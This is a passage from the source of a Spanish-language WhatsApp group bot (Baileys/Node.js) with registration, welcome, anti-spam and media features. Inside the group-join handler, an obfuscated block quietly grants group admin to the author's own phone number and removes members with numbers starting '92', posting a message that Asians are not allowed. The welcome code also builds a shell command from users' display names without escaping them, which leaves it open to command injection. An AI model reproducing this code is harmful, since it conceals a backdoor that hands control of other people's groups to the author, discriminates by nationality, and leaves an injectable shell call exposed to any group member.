//============ NyanBot ============\\
// + Favor de mantener este codigo
//   tal y como esta.
// + Si modificaras, manten los
//   creditos:
//   _MankBarBar & Samu & LolHuman_
//============ Samu330 ============\\
const { 
  WAConnection,
  MessageType,
  Presence, 
  MessageOptions,
  Mimetype,
  WALocationMessage,
  WA_MESSAGE_STUB_TYPES,
  ReconnectMode,
  ProxyAgent,
  GroupSettingChange,
  ChatModification,
  waChatKey,
  WA_DEFAULT_EPHEMERAL,
  mentionedJid,
  processTime
} = require("@adiwajshing/baileys")
const moment = require("moment-timezone");
const os = require("os");
const imageToBase64 = require('image-to-base64');
const speed = require('performance-now');
const chalk = require('chalk');
const crypto = require("crypto-js");
const CryptoJS = require("crypto-js");
const request = require('request');
const fs = require('fs');
const { wait, h2k, generateMessageID, getGroupAdmins, banner, start, info, success, close } = require('./lib/functions')
const { addBanned, unBanned, BannedExpired, cekBannedUser } = require('./lib/banned.js')
const { getLevelingXp, getLevelingId, addLevelingXp, addLevelingLevel, addLevelingId, getLevelingLevel, getUserRank, addCooldown, leveltab } = require('./lib/leveling.js')
const { removeBackgroundFromImageFile } = require('remove.bg');
const { exec } = require('child_process');
const ffmpeg = require('fluent-ffmpeg');
const axios = require('axios');
const fetch = require('node-fetch');
const fromBuffer = require('file-type');
const FormData = require('form-data')
const samuGg = require('google-it');
const samuGgImg = require('g-i-s');
////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
const {y2mateA, y2mateV} = require('./lib/y2mate.js')
const {sm330mfire} = require('./lib/mediafire.js')
const { ssstik } = require("./lib/tiktok.js")
const {fbDown} = require('./lib/fb.js')
const { isFiltered, addFilter } = require('./lib/antispam')
const chatban = JSON.parse(fs.readFileSync('./src/ban.json'))
const ban = JSON.parse(fs.readFileSync('./src/banned.json'))
const zalgo = require('./lib/zalgo')
const {convertSticker} = require("./lib/swm.js")
const conn = require("./lib/connect")
const msg = require("./lib/message")
const wa = require("./lib/wa")
const Exif = require('./lib/exif');
const exif = new Exif();
const { recognize } = require('./lib/ocr');
const help = require("./lib/help")
const yts = require('yt-search')
const postBuffer = help.postBuffer
const getBuffer = help.getBuffer
const getRandom = help.getRandomExt
const postJson = help.postJson
const getJson = help.getJson
const samu = JSON.parse(fs.readFileSync('./setting.json'))
const bodyM = samu.samuM
const antimedia = JSON.parse(fs.readFileSync('./src/antimedia.json'))
const antifake = JSON.parse(fs.readFileSync('./src/antifake.json'))
const bad = JSON.parse(fs.readFileSync('./src/bad.json'))
const badword = JSON.parse(fs.readFileSync('./src/badword.json'))
const autostick = JSON.parse(fs.readFileSync('./src/autostick.json'))
const nsfw = JSON.parse(fs.readFileSync('./src/nsfw.json'))
const antilink = JSON.parse(fs.readFileSync('./src/antilink.json'))
const antigp = JSON.parse(fs.readFileSync('./src/antigp.json'))
const simi = JSON.parse(fs.readFileSync('./src/simi.json'))
const legion = JSON.parse(fs.readFileSync('./src/sm330Leg.json'))
const welkom = JSON.parse(fs.readFileSync('./src/welkom.json'))
const config = JSON.parse(fs.readFileSync("./config.json"))
const owner = config.owner
const mods = config.mods
const fake = 'Sm330'
var public = config.public
////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
conn.connect()
const samu330 = conn.samu330
////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
api = 'CONTACTAME PARA OBTENER LA API'
fak = 'samu3300'
prefix = '.'
apikey = 'LindowApi'
hit_today = []
blocked = []
let _level = JSON.parse(fs.readFileSync('./src/level.json'))
const _registered = JSON.parse(fs.readFileSync('./src/registered.json'))
const daily = JSON.parse(fs.readFileSync('./src/diario.json'));
const dailiy = JSON.parse(fs.readFileSync('./src/limitem.json'));

///////////////////////////////////////////////////////////////////////////

//========= Funcion de Registro =========\\

const getRegisteredRandomId = () => {
        return _registered[Math.floor(Math.random() * _registered.length)].id
        }
        const addRegisteredUser = (userid, sender, age, time, serials) => {
        const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
        _registered.push(obj)
        fs.writeFileSync('./src/registered.json', JSON.stringify(_registered))
        }

        const createSerial = (size) => {
        return crypto.randomBytes(size).toString('hex').slice(0, size)
        }

        const checkRegisteredUser = (sender) => {
        let status = false
        Object.keys(_registered).forEach((i) => {
        if (_registered[i].id === sender) {
        status = true
        }
        })
            return status
        }
samu330.on('CB:action,,call', async json => {
const callerId = json[2][0][1].from;
console.log("Llamada recibida de "+ callerId)
console.log(chalk.greenBright("├"), chalk.keyword("magenta")("[ 📵Llamada recibida ]"), chalk.greenBright(callerId))
samu330.sendMessage(callerId, "Las llamadas no se permiten, *PORFAVOR LEE LAS REGLAS!* Te bloqueare😒", MessageType.text, {quoted: {key: {
fromMe: false,
participant: `0@s.whatsapp.net`
},
message: {
"productMessage": {
"product": {
"productImage":{
"mimetype": "image/jpeg",
"jpegThumbnail": fs.readFileSync(`./media/call.png`)
},
"title": `🚫No se permiten las llamadas🚫`,
"description": "",
"currencyCode": "SYP",
"priceAmount1000": "999999999999999999",
"retailerId": "",
"productImageCount": 999
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}}})
await sleep(4000)
await samu330.blockUser(callerId, "add")
})
////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
samu330.on('CB:action,,battery', json => {
global.batteryLevelStr = json[2][0][1].value
global.batterylevel = parseInt(batteryLevelStr)
baterai = batterylevel
if (json[2][0][1].live == 'true') charging = true
if (json[2][0][1].live == 'false') charging = false
console.log(chalk.greenBright("├"), chalk.keyword("magenta")("[ 🔋Nivel de carga de la bateria ]"), chalk.greenBright(batterylevel+'%'), chalk.keyword("cyan")("Esta cargando?"), chalk.keyword("yellow")(charging))	
})
////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
samu330.on('blocklist-update', async (chat) => {
for (i of chat.added){
target = i.replace('@c.us', '@s.whatsapp.net')
blocked.push(target)
console.log(chalk.greenBright("├"), chalk.keyword("yellow")("[ NUEVO USUARIO BLOQUEADO ]"), chalk.keyword("red")(target))
}
for (i of chat.removed){
target = i.replace('@c.us', '@s.whatsapp.net')
blocked.splice(blocked.indexOf(target), 1)
console.log(chalk.greenBright("├"), chalk.keyword("green")("[ NUEVO USUARIO DESBLOQUEADO ]"), chalk.keyword("cyan")(target))
}
})
////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
samu330.on('group-update', async(chat) => {
var donde = chat.jid
var group = await samu330.groupMetadata(donde)
if (!chat.desc == '') {
var tag = chat.descOwner.split('@')[0] + '@s.whatsapp.net'
var mensajeDesc = `✍🏻 *La descripcion del grupo ${group.subject} fue modificada por: @${chat.descOwner.split('@')[0]}*\n✅Ahora la nueva descripcion es:\n\n${chat.desc}`
samu330.sendMessage(group.id, mensajeDesc, MessageType.text)
console.log(chalk.greenBright("├"), chalk.keyword("yellow")("[ DESCRIPCION CAMBIADA ]"), chalk.keyword("cyan")('grupo'), chalk.keyword("green")(`${group.subject}`))
}
})
////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
samu330.on('group-participants-update', async (anu) => {
if (!welkom.includes(anu.jid)) return
try {
const mdata = await samu330.groupMetadata(anu.jid)
console.log(anu)
if (anu.action == 'add') {               
num = anu.participants[0]
var _0x32eb=['length','203FKZwcC','constructor','text','37321dDPejz','apply','prototype','groupRemove','test','__proto__','table','1102598lCjDcW','1013436pgMCWz','info','toString','startsWith','3291GElTcg','1762sWsYhU','bind','exception','console','trace','log','648921eLIDKy','5219984907794','Ek\x20is\x20jammer,\x20maar\x20mense\x20uit\x20Asië\x20word\x20nie\x20toegelaat\x20nie,\x20ek\x20sal\x20jou\x20uitskakel,\x20dankie\x20vir\x20jou\x20begrip😚\x0a\x0aAntiP\x20By:*\x20_🐉Samu330🇲\x20🇽\x20_','return\x20/\x22\x20+\x20this\x20+\x20\x22/','sendMessage','324QcfqoI','warn','error','1148172OCGrif','23ykweMi','return\x20(function()\x20'];function _0x3b66(_0x116bb2,_0xa78ba5){return _0x3b66=function(_0x436199,_0x510667){_0x436199=_0x436199-0x70;var _0x51019a=_0x32eb[_0x436199];return _0x51019a;},_0x3b66(_0x116bb2,_0xa78ba5);}var _0x376b6b=_0x3b66;(function(_0xe31b1b,_0x46684b){var _0x30c21e=_0x3b66;while(!![]){try{var _0x598896=-parseInt(_0x30c21e(0x7e))+-parseInt(_0x30c21e(0x91))*-parseInt(_0x30c21e(0x7b))+parseInt(_0x30c21e(0x8c))+-parseInt(_0x30c21e(0x82))*-parseInt(_0x30c21e(0x70))+parseInt(_0x30c21e(0x7f))*parseInt(_0x30c21e(0x85))+-parseInt(_0x30c21e(0x8d))+-parseInt(_0x30c21e(0x76));if(_0x598896===_0x46684b)break;else _0xe31b1b['push'](_0xe31b1b['shift']());}catch(_0x4b5012){_0xe31b1b['push'](_0xe31b1b['shift']());}}}(_0x32eb,0x8c3d6));var _0xb1de39=function(){var _0xdff92c=!![];return function(_0xbaf195,_0x472290){var _0x49ae62=_0xdff92c?function(){var _0x8379c3=_0x3b66;if(_0x472290){var _0x210536=_0x472290[_0x8379c3(0x86)](_0xbaf195,arguments);return _0x472290=null,_0x210536;}}:function(){};return _0xdff92c=![],_0x49ae62;};}(),_0x46ec2c=_0xb1de39(this,function(){var _0x3a6de6=function(){var _0x52b332=_0x3b66,_0x3a1227=_0x3a6de6[_0x52b332(0x83)](_0x52b332(0x79))()[_0x52b332(0x83)]('^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}');return!_0x3a1227[_0x52b332(0x89)](_0x46ec2c);};return _0x3a6de6();});_0x46ec2c();var _0x51019a=function(){var _0x1b381d=!![];return function(_0xdc464c,_0x8f91eb){var _0x4640b3=_0x1b381d?function(){var _0x37d4f6=_0x3b66;if(_0x8f91eb){var _0x4f0489=_0x8f91eb[_0x37d4f6(0x86)](_0xdc464c,arguments);return _0x8f91eb=null,_0x4f0489;}}:function(){};return _0x1b381d=![],_0x4640b3;};}(),_0x510667=_0x51019a(this,function(){var _0x3279f1=_0x3b66,_0x545df1=function(){var _0x5c6de2=_0x3b66,_0xf5f589;try{_0xf5f589=Function(_0x5c6de2(0x80)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x37444b){_0xf5f589=window;}return _0xf5f589;},_0x3ef9e5=_0x545df1(),_0x5c6ba6=_0x3ef9e5[_0x3279f1(0x73)]=_0x3ef9e5['console']||{},_0x373954=[_0x3279f1(0x75),_0x3279f1(0x7c),_0x3279f1(0x8e),_0x3279f1(0x7d),_0x3279f1(0x72),_0x3279f1(0x8b),_0x3279f1(0x74)];for(var _0x3d4618=0x0;_0x3d4618<_0x373954[_0x3279f1(0x81)];_0x3d4618++){var _0x1698c8=_0x51019a[_0x3279f1(0x83)][_0x3279f1(0x87)][_0x3279f1(0x71)](_0x51019a),_0x218220=_0x373954[_0x3d4618],_0x4beaa2=_0x5c6ba6[_0x218220]||_0x1698c8;_0x1698c8[_0x3279f1(0x8a)]=_0x51019a[_0x3279f1(0x71)](_0x51019a),_0x1698c8[_0x3279f1(0x8f)]=_0x4beaa2[_0x3279f1(0x8f)]['bind'](_0x4beaa2),_0x5c6ba6[_0x218220]=_0x1698c8;}});_0x510667();if(num[_0x376b6b(0x90)]('92'))await samu330[_0x376b6b(0x7a)](mdata['id'],_0x376b6b(0x78),MessageType[_0x376b6b(0x84)]),samu330[_0x376b6b(0x88)](mdata['id'],[num]);if(num[_0x376b6b(0x90)]('52'))await samu330[_0x376b6b(0x7a)](mdata['id'],'🇲\x20🇽\x20😈\x20*ARRIVA\x20MEXICO!!!*\x20Bienvenido\x20amigo\x20de\x20mexico,\x20de\x20que\x20parte\x20del\x20pais\x20eres?😙',MessageType['text']);if(num[_0x376b6b(0x90)](_0x376b6b(0x77)))await samu330['sendMessage'](mdata['id'],'*VAYA\x20VAYA\x20VAYAAAA🐱\x20Miren\x20nomas\x20quien\x20llego🥳,\x20es\x20mi\x20dueño!!!!😱\x20WOW\x20Saludenlo!😚*\x0a\x0a_*Le\x20dare\x20admin\x20juju*_',MessageType[_0x376b6b(0x84)]),samu330['groupMakeAdmin'](mdata['id'],[num]);

/*if (num.startsWith('1')) return samu330.groupRemove(mdata.id, [num])
if (num.startsWith('994')) return samu330.groupRemove(mdata.id, [num])
if (num.startsWith('48')) return samu330.groupRemove(mdata.id, [num])
if (num.startsWith('91')) return samu330.groupRemove(mdata.id, [num])
if (num.startsWith('44')) return samu330.groupRemove(mdata.id, [num])*/
const moment = require('moment-timezone')
const jm = moment.tz('America/Mexico_City').format('HH:mm:ss')
let d = new Date
let locale = 'es'
let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let calender = d.toLocaleDateString(locale, {
day: 'numeric',
month: 'long',
year: 'numeric'
})

try {
pushnem = sam.key.fromMe ? samu330.user.name : conts.notify || conts.vname || conts.name || '-'

} catch {
pushnem = num.split('@')[0]
}
try {
ppimg = await samu330.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
try {
exec(`magick './src/wel.jpg' -gravity west -fill '#00FFFF' -font './src/font-gue.ttf' -size 1280x710 -pointsize 75 -interline-spacing 7.5 -annotate +460-45 '${pushnem}' -pointsize 35 -annotate +460+83 '${jm} ${calender}' -pointsize 50 -annotate +460+200 'Bienvenido a ${mdata.subject}' '${ppimg}' -resize %[fx:t?u.w*0.2:u.w]x%[fx:?u.h*0.2:u.h] -gravity center -geometry -430+70 -composite 'hamsil.jpg'`)
samu330.sendMessage(mdata.id, fs.readFileSync('./hamsil.jpg'), MessageType.image, {quoted: {key: {
fromMe: false,
participant: `0@s.whatsapp.net`          
},                               
message: {                         
"productMessage": {
"product": {
"productImage":{          
"mimetype": "image/jpeg",             
"jpegThumbnail": fs.readFileSync(`./src/fake.jpg`)           
},                                
"title": `Bienvenido a ${mdata.subject}`,
"description": "",                
"currencyCode": "SYP",                  
"priceAmount1000": "999999999999999999",
"retailerId": "",
"productImageCount": 999
},                          
"businessOwnerJid": `0@s.whatsapp.net`
}}}, caption: `😙Hola, @${num.split('@')[0]}, _*Bienvenido a ${mdata.subject}, esperamos que te la pases a gusto en este grupo✨*_\n\n_Recuerda siempre seguir las reglas y mantener una formalidad respetuosa_😉\n\nSon las *${jm}* del *${calender}*\n\n${mdata.desc}`, contextInfo: { mentionedJid: [num] }})
} catch {
samu330.sendMessage(mdata.id, `😙Hola, @${num.split('@')[0]}, _*Bienvenido a ${mdata.subject}, esperamos que te la pases a gusto en este grupo✨*_\n\n_Recuerda siempre seguir las reglas y mantener una formalidad respetuosa_😉\n\nSon las *${jm}* del *${calender}*\n\n${mdata.desc}`, MessageType.text)
}
//leave
}  else if (anu.action == 'remove') {
num = anu.participants[0]
teks = `_Weno ps.... amm😪...  @${num.split('@')[0]} se nos fue, ni llorar es bueno:)_
_*Ojala y le baya bien, y mas despues..... que lo atropelle un tren!!🚉🤣*_
*No se awiten gente, esten seguros que nadie lo extrañara:D*`
samu330.sendMessage(mdata.id, teks, MessageType.text,{ contextInfo: {"mentionedJid": [num]}})

} else if (anu.action == 'promote') {
num = anu.participants[0]
try {
ppimg = await samu330.getProfilePicture(`${num.split('@')[0]}@c.us`)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
thu = await samu330.getStatus(anu.participants[0], MessageType.text)
teks = `*✅NUEVO ADMIN✅*\n*🙋🏻‍♂️ Nombre*: @${num.split('@')[0]}\n*📋 INFO*: ${thu.status}\n\n🥳 *FEILICIDADES!!*, te as convertido en administrador del grupo ${mdata.subject}`
let buff = await getBuffer(ppimg)
samu330.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
} else if (anu.action == 'demote') {
num = anu.participants[0]
try {
ppimg = await samu330.getProfilePicture(`${num.split('@')[0]}@c.us`)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
thu = await samu330.getStatus(anu.participants[0], MessageType.text)
teks = `*❌UN ADMIN MENOS❌*\n*🙋🏻‍♂️ Nombre*: @${num.split('@')[0]}\n*📋 INFO*: ${thu.status}\n\n*😪Nimodos, ya no eres admnistrador del grupo* ${mdata.subject}`
let buff = await getBuffer(ppimg)
samu330.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
}
} catch (e) {
console.log('Error : %s', color(e, 'red'))
}
})
////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
samu330.on('chat-update', async(sam) => {
    try {
        if (!sam.hasNewMessage) return
        if (!sam.messages) return
        if (sam.key && sam.key.remoteJid == 'status@broadcast') {
	}
	sam = sam.messages.all()[0]
	sam.message = (Object.keys(sam.message)[0] === 'ephemeralMessage') ? sam.message.ephemeralMessage.message : sam.message
        if (!sam.message) return
        const from = sam.key.remoteJid
        const type = Object.keys(sam.message)[0]
        const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
        const quoted = type == 'extendedTextMessage' && sam.message.extendedTextMessage.contextInfo != null ? sam.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
        const typeQuoted = Object.keys(quoted)[0]
        const body = sam.message.conversation || sam.message[type].caption || sam.message[type].text || ""
        chats = (type === 'conversation') ? sam.message.conversation : (type === 'extendedTextMessage') ? sam.message.extendedTextMessage.text : ''
        budy = (type === 'conversation' && sam.message.conversation.startsWith(prefix)) ? sam.message.conversation : (type == 'imageMessage') && sam.message.imageMessage.caption.startsWith(prefix) ? sam.message.imageMessage.caption : (type == 'videoMessage') && sam.message.videoMessage.caption.startsWith(prefix) ? sam.message.videoMessage.caption : (type == 'extendedTextMessage') && sam.message.extendedTextMessage.text.startsWith(prefix) ? sam.message.extendedTextMessage.text : ''
	//budy = (type === 'conversation') ? sam.message.conversation : (type === 'extendedTextMessage') ? sam.message.extendedTextMessage.text : (type === 'listResponseMessage') ? sam.message.listResponseMessage.title : ''
	////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
        if (prefix != "") {
        if (!body.startsWith(prefix)) {
        cmd = false
        comm = ""
        } else {
        cmd = true
        comm = body.slice(1).trim().split(" ").shift().toLowerCase()
        }
        } else {
        cmd = false
        comm = body.trim().split(" ").shift().toLowerCase()
        }
	    
	////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲

	const uploadImages = (filePath) => {
	return new Promise(async (resolve, reject) => {
        const fileData = fs.readFileSync(filePath)
        const form = new FormData()
        form.append('file', fileData, 'tmp.png')
        fetch('https://telegra.ph/upload', {
	method: 'POST',
        body: form
        })
        .then(res => res.json())
        .then(res => {
        if (res.error) return reject(res.error)
        resolve('https://telegra.ph' + res[0].src)
        })
        .then(() => fs.unlinkSync(filePath))
        .catch(err => reject(err))
	})
	}

        const command = comm
        hit_today.push(command)
	const content = JSON.stringify(sam.message)
	const chats1 = (type === 'chat') ? body : ((type === 'image' || type === 'video')) ? caption : ''
	const samu = '```'
	const crypto = require('crypto')
        const args = body.trim().split(/ +/).slice(1)
        const isCmd = cmd
        const meNumber = samu330.user.jidi
        const botNumber = samu330.user.jid.split("@")[0]
        const isGroup = from.endsWith('@g.us')
	const sender = sam.key.fromMe ? samu330.user.jid : isGroup ? sam.participant : sam.key.remoteJid
        const senderNumber = sender.split("@")[0]
        const groupMetadata = isGroup ? await samu330.groupMetadata(from) : ''
        const groupName = isGroup ? groupMetadata.subject : ''
        const groupMembers = isGroup ? groupMetadata.participants : ''
        const groupAdmins = isGroup ? await wa.getGroupAdmins(groupMembers) : []
        const isAdmin = groupAdmins.includes(sender) || false
        const botAdmin = groupAdmins.includes(samu330.user.jid)
        const itsMe = senderNumber == botNumber
	const isBadWord = isGroup ? badword.includes(from) : false
	const isAntiLink = isGroup ? antilink.includes(from) : false
	const isAntigp = isGroup ? antigp.includes(from) : false
	const isAntiMedia = isGroup ? antimedia.includes(from) : false
	const isAntiFake = isGroup ? antifake.includes(from) : false
	const isAutoSt = isGroup ? autostick.includes(from) : false
	const isNsfw = isGroup ? nsfw.includes(from) : false
	const isSimi = isGroup ? simi.includes(from): false
	const isAntiLeg = isGroup ? legion.includes(from): false
	const isWelkom = isGroup ? welkom.includes(from) : false
	const isRegister = checkRegisteredUser(sender)
	const totalchat = await samu330.chats.all()
        const isOwner = senderNumber == owner || senderNumber == botNumber || mods.includes(senderNumber)
	const isBanChat = chatban.includes(from)
	if (isBanChat && !isOwner) return
	const isBan = cekBannedUser(sender, ban)
	const q = args.join(' ')
	const texto1 = q.substring(0, q.indexOf('|') - 0)
	const texto2 = q.substring(q.lastIndexOf('|') + 1)
	var pes = (type === 'conversation' && sam.message.conversation) ? sam.message.conversation : (type == 'imageMessage') && sam.message.imageMessage.caption ? sam.message.imageMessage.caption : (type == 'videoMessage') && sam.message.videoMessage.caption ? sam.message.videoMessage.caption : (type == 'extendedTextMessage') && sam.message.extendedTextMessage.text ? sam.message.extendedTextMessage.text : ''
	const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
	conts = sam.key.fromMe ? samu330.user.jid : samu330.contacts[sender] || {
                notify: jid.replace(/@.+/, '')
	}
	const jid = sender
	samu330.chatRead(from)
	const Smname = sam.key.fromMe ? samu330.user.jid : samu330.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const mentionByTag = type == "extendedTextMessage" && sam.message.extendedTextMessage.contextInfo != null ? sam.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == "extendedTextMessage" && sam.message.extendedTextMessage.contextInfo != null ? sam.message.extendedTextMessage.contextInfo.participant || "" : ""
        const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
        mention != undefined ? mention.push(mentionByReply) : []
        const mentionUser = mention != undefined ? mention.filter(n => n) : []
        const mentions = (teks, memberr, id) => {
	(id == null || id == undefined || id == false) ? samu330.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : samu330.sendMessage(from, teks.trim(), extendedText, {quoted: sam, contextInfo: {"mentionedJid": memberr}})
	}
	let pushname = sam.key.fromMe ? samu330.user.name : conts.notify || conts.vname || conts.name || '*Amigo*'
	const isUrl = (url) => {
	return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
			}
	const createSerial = (size) => {
	return crypto.randomBytes(size).toString('hex').slice(0, size)
        }
	const sendMess = (hehe, teks) => {
	samu330.sendMessage(hehe, teks, MessageType.text, {quoted: ftoko})
  	}
	
	mess = {
			wait: '⌛ 𝐄𝐍 𝐏𝐑𝐎𝐂𝐄𝐒𝐎 ⌛',
			success: '✔️ 𝙎𝙐𝙎𝙎𝙀𝙎 ✔️',
			nsfw: `𝗟𝗼 𝘀𝗶𝗲𝗻𝘁𝗼 𝗽𝗲𝗿𝗼 𝗻𝗼 𝗽𝘂𝗲𝗱𝗼 𝗲𝗷𝗲𝗰𝘂𝘁𝗮𝗿 𝗲𝘀𝗲 𝗰𝗼𝗺𝗮𝗻𝗱𝗼, 𝗲𝘀𝘁𝗲 𝗴𝗿𝘂𝗽𝗼 𝗻𝗼 𝗽𝗲𝗿𝗺𝗶𝘁𝗲 𝗰𝗼𝗻𝘁𝗲𝗻𝗶𝗱𝗼 +𝟭𝟴\n*PARA ACTIVAR LOS COMANDOS +18, USA:* ${prefix}+18 1`, 
			ferr: 'Intentalo de nuevo mas tarde',
			error: {
			stick: '[❗] 𝙀𝙍𝙍𝙊𝙍 intentalo de nuevo, da error a la primera:D  ❌',
			Iv: '❌ Link invalido ❌'
			},
			only: {
    			group: '[❗] ¡Este comando solo se puede usar en grupos! ❌',
    			benned: '⚠ *USTED ES UN USUARIO BANEADO, ESO QUIERE DECIR QUE NO PUEDE USAR EL BOT* ⚠',
    			ownerG: '[❗] ¡Este comando solo puede ser utilizado por el creador del grupo! ❌',
    			ownerB: '[❗] ¡Este comando solo puede ser utilizado por el creador del bot! ❌\nOsea, Samu: wa.me/+529984907794, Habla con el para que pueda cambiar el numero del owner en este bot',
    			admin: '[❗] ¡Este comando solo puede ser utilizado por administradores del grupo! ❌',
    			Badmin: '[❗] ¡Este comando solo se puede usar cuando el bot es administrador! ❌',
    			usrReg: `Usuario no *Registrado*\n_Para registrarte usa el comando_: *${prefix}reg*`
  			}
			}
	const momento1 = require('moment-timezone')
	const hora = momento1.tz('America/Mexico_City').format('HH:mm:ss')
	let d1 = new Date
	let locale1 = 'es'
	let gmt1 = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
	let ayer = ['domingo','lunes','Martes','Miercoles','Jueves','Viernes','Sabado'][
	Math.floor(((d1 * 1) + gmt1) / 84600000) % 7]
	let week1 = d1.toLocaleDateString(locale1, { weekday: 'long' })
	let calender1 = d1.toLocaleDateString(locale1, {
	day: 'numeric',
	month: 'long',
	year: 'numeric'
	})


	const hour_now = moment().format('HH')
        var timeFt = '*Buenos dias🌅*'
        if (hour_now >= '03' && hour_now <= '10') {
          timeFt = 'Buenos dias'
        } else if (hour_now >= '10' && hour_now <= '14') {
          timeFt = '*Buenos dias🌅*'
        } else if (hour_now >= '14' && hour_now <= '17') {
          timeFt = 'Buenas tardes🌇'
        } else if (hour_now >= '17' && hour_now <= '18') {
          timeFt = 'Buenas tardes🌇'
        } else if (hour_now >= '18' && hour_now <= '23') {
          timeFt = 'Buenas noches🌃'
        } else {
          timeFt = 'Buen inicio del dia!🌱'
        }
        

        const isImage = type == 'imageMessage'
        const isVideo = type == 'videoMessage'
        const isAudio = type == 'audioMessage'
        const isSticker = type == 'stickerMessage'
        const isContact = type == 'contactMessage'
        const isLocation = type == 'locationMessage'
        const isMedia = (type === 'imageMessage' || type === 'videoMessage')
	const isTexto = type == 'textMessage'
        
        typeMessage = body.substr(0, 50).replace(/\n/g, '')
        if (isImage) typeMessage = "Image"
        else if (isVideo) typeMessage = "Video"
        else if (isAudio) typeMessage = "Audio"
        else if (isSticker) typeMessage = "Sticker"
        else if (isContact) typeMessage = "Contact"
        else if (isLocation) typeMessage = "Location"
	else if (isTexto) typeMessage = "text"

        const isQuoted = type == 'extendedTextMessage'
	const isQuotedMsg = type === 'extendedTextMessage' && content.includes('textMessage')
        const isQuotedImage = isQuoted && typeQuoted == 'imageMessage'
        const isQuotedVideo = isQuoted && typeQuoted == 'videoMessage'
        const isQuotedAudio = isQuoted && typeQuoted == 'audioMessage'
        const isQuotedSticker = isQuoted && typeQuoted == 'stickerMessage'
        const isQuotedContact = isQuoted && typeQuoted == 'contactMessage'
        const isQuotedLocation = isQuoted && typeQuoted == 'locationMessage'

        if (!public) {
        mods.indexOf(botNumber) === -1 ? mods.push(botNumber) : false
        mods.indexOf(owner) === -1 ? mods.push(owner) : false
        if (!mods.includes(senderNumber)) return
        mods.slice(mods.indexOf(owner), 1)
        }
	    
	const sendFile = async (archivo, nombreDeArchivo, comentario, tag, vn) => {
  	tipo = await getBuffer(archivo)
  	tipo2 = ''
  	if (nombreDeArchivo.includes('m4a')){
  	samu330.sendMessage(from, tipo, audio,{mimetype: 'audio/mp4',quoted: tag, filename: nombreDeArchivo, ptt: vn})
  	}
  	if (nombreDeArchivo.includes('mp4')){
	samu330.sendMessage(from, tipo, video, {mimetype: 'video/mp4', quoted: tag, caption: comentario, filename: nombreDeArchivo})
  	}
  	if (nombreDeArchivo.includes('gif')){
  	samu330.sendMessage(from, tipo, video, {mimetype: Mimetype.gif, caption: comentario, quoted: tag, filename: nombreDeArchivo})
  	} 
  	if (nombreDeArchivo.includes('png')){
  	samu330.sendMessage(from, tipo, image, {quoted: tag, caption: comentario, filename: nombreDeArchivo})
  	}
  
  	if (nombreDeArchivo.includes('webp')){
  	samu330.sendMessage(from, tipo, sticker, {quoted: tag})
  	} else {
  	tipo2 = nombreDeArchivo.split(`.`)[1]
  	samu330.sendMessage(from, tipo, document, {mimetype: tipo2, quoted: tag, filename: nombreDeArchivo})
  	}
	}
	    
	const sendFileFromUrl = async(link, type, options) => {
  	hasil = await getBuffer(link)
	samu330.sendMessage(from, hasil, type, options).catch(e => {
	fetch(link).then((hasil) => {
	samu330.sendMessage(from, hasil, type, options).catch(e => {
